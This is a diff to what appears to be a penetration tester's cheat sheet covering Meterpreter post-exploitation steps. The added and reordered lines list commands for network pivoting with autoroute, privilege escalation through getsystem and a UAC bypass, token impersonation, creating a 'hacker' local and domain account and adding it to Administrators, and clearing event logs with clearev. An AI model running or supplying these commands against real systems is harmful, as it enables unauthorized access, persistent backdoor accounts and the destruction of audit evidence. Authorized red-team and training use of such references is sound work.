@@ -208,6 +208,11 @@ exploit
 
 # Meterpreter - Post Exploitation
 
+ipconfig                                      Look for dual-homed connections.
+     autoroute -s <new CIDR range>            If dual-homed.
+     autoroute -p                             Print routing table.
+netstat
+
 getpid                                        Show the current process ID.
 ps                                            Show running processes.
 migrate                                       Create a new process and migrate to it.
@@ -215,9 +220,10 @@ migrate <pid>                                 Migrate to a specific process.
 
 sysinfo                                       Show system info.
 getuid                                        Show current privileges.
-getprivs                                      Escalate privileges if not NT AUTHORITY\SYSTEM.
-getsystem                                     If this fails: run post/windows/escalate/bypassuac.
-getuid                                        Privileges should now be NT AUTHORITY\SYSTEM.
+
+     getprivs                                 Escalate privileges if not NT AUTHORITY\SYSTEM.
+     getsystem                                If this fails: run post/windows/escalate/bypassuac.
+     getuid                                   Privileges should now be NT AUTHORITY\SYSTEM.
 
 screenshot                                    Take a photo of the desktop.
 
@@ -231,14 +237,15 @@ run getgui -u hacker -p password
 use incognito
 list_tokens -u
 impersonate_token <domain>\\<user>
+
 shell
-whoami
-
-ipconfig                                      Look for dual-homed connections.
-autoroute -s <new CIDR range>                 If dual-homed.
-autoroute -p                                  Print routing table.
 route
-
+net user                                      List local users.
+net accounts                                  List local password policy.
+net user hacker password /add /domain         Try to add a new domain account.
+net user hacker password /add                 Add a new local account.
+net localgroup Administrators hacker /add     Add new account to the local Administrators Security Group
+net localgroup Administrators                 Verify account is in the group.
 clearev                                       Clear event logs.
 ------------------------------------------------------------------------------------------------------
 
